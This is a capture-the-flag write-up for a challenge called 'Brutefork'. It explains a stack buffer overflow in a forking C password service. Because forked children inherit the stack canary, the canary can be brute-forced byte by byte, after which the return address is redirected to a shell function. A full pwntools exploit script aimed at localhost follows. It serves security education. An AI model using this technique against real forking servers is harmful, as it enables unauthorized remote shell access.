#Brutefork

## Description

> I locked myself out of my server and it doesn't accept my password anymore :(
>
> Can you restore access please?

## Solution

We are supplied with a binary, its source code and a connection to a server where the binary is running. Having access to the source code will greatly speed up the reversing process, since we don't have to deal with assembly code.

First we are going to read the source code in order to understand the service and find an exploitable vulnerability. Then analyze and exploit the vulnerability to get remote code execution on the server.

To solve this challenge, the following tools were used:

- [Python](https://www.python.org/)

- [pwntools](https://github.com/Gallopsled/pwntools)

### Analyzing the Source Code

When reading through the source code, the first thing that stands out is that the service implements its own fork server.

```c
// create socket
int sockfd = socket(AF_INET, SOCK_STREAM, 0);

// set address (any) and port (PORT)
struct sockaddr_in addr = {0};
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);
addr.sin_addr.s_addr = htonl(INADDR_ANY);

// prepare for accepting connections
bind(sockfd, (struct sockaddr *)&addr, sizeof addr);
listen(sockfd, 8);

while (1) {
    // wait for new connection
    int clientfd = accept(sockfd, NULL, NULL);

    // fork: parent waits for next connection, child handles connection
    if (fork() == 0) {
        // in child
        handle();
        return EXIT_SUCCESS;
    }
}
```

This is unusual to see in an exploitation challenge, so probably relevant for the solution.

Apart from that, a handy `shell` function is provided, which unconditionally spawns a shell for us.

```c
void shell(void) {
    execl("/bin/sh", "sh", (char *)NULL);
}
```

Unfortunately, there's no way we can reach this function using the intended control flow, because the password check always returns `false`.

```c
bool check_pass(const char *pass) {
    return false;
}

void handle(void) {
    char buf[100];

    printf("Input password: ");
    read(STDIN_FILENO, buf, 0x100);

    if (check_pass(buf)) {
        printf("Authenticated. Here's your shell:\n");
        shell();
    } else {
        printf("Authentication failed!\n");
    }
}
```

However, looking at the function above we can spot a bug: the password buffer `buf` holds `100` bytes, but we can write up to `0x100 == 256` bytes.

Now that we completely analyzed the source code, we can proceed to exploit the service.

### Exploiting the Service

So far this looks like a classic stack buffer overflow: we overflow the stack buffer up to the saved return address and overwrite it with the address of the provided `shell` function. When the `handle` function returns, it would "return into" the `shell` function, and spawn a shell.

But as it turns out, the binary was compiled with stack canaries enabled:

```c
// built with:
//   gcc -no-pie -fstack-protector-all -O0 -m32 -ggdb3 -o brutefork brutefork.c
```

With this option, the compiler inserts a stack canary (also called stack cookie or stack protector) between the local variables and the return address, and verifies its integrity before using the stored return address. Currently, the canary is generated randomly on process startup and the same canary is used for all functions.

We conclude that the bug we found is not enough to actually exploit the service, we also have to somehow bypass the stack canary.

This is where the forkserver becomes relevant: when a process forks, the stack canary is preserved! This is actually related to the fact that a single canary is used for all functions: the child process may return from functions which were entered before the fork. For these functions, the canary stored on the stack will inevitably be the canary of the process before the fork. So, in order to be able to successfully verify the integrity of the canary, the child process has to use the same canary.

But how does that help us in bypassing the canary? It's still unknown and initially randomly generated. However, we can bruteforce the first byte of the canary if we connect to the service multiple times to try each possible byte. Afterwards, we repeat the same process on the next byte, until we know the whole canary.

Now that we know how to get the canary, the exploit turns into a classic stack buffer overflow as described above: overwrite the saved return address to return into the `shell` function.

Flag: `CSR{th1s_w0rk5_f0r_ASLR_7oo!!}`

### Exploit Code

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.binary = 'brutefork'


def exploit():
    bytes = [chr(n) for n in range(256)]

    p = log.progress("Leaking canary")
    canary = '\0'

    while len(canary) < 4:
        for b in bytes:
            guess = canary + b

            p.status("%s", ' '.join(enhex(c) for c in guess))
            if try_canary(guess):
                canary = guess
                break
        else:
            log.error("Failed to leak canary")

    p.success("%s", ' '.join(enhex(c) for c in canary))

    r = connection(canary + 'B'*12 + p32(context.binary.symbols.shell))
    sleep(1)
    r.sendline('cat flag')
    log.success("Flag: %s", r.recvline_contains('CSR').strip())


def try_canary(guess):
    with context.local(log_level='ERROR'):
        r = connection(guess)
        ret = r.recvall()
        r.close()
        return ret.strip().endswith('failed!')


def connection(canary):
    r = remote('localhost', 1337)
    r.sendafter('password: ', 'A' * 100 + canary)
    return r


if __name__ == "__main__":
    exploit()
```


##Flag
`CSR{th1s_w0rk5_f0r_ASLR_7oo!!}`


##Creator
Jan-Niklas Sohn



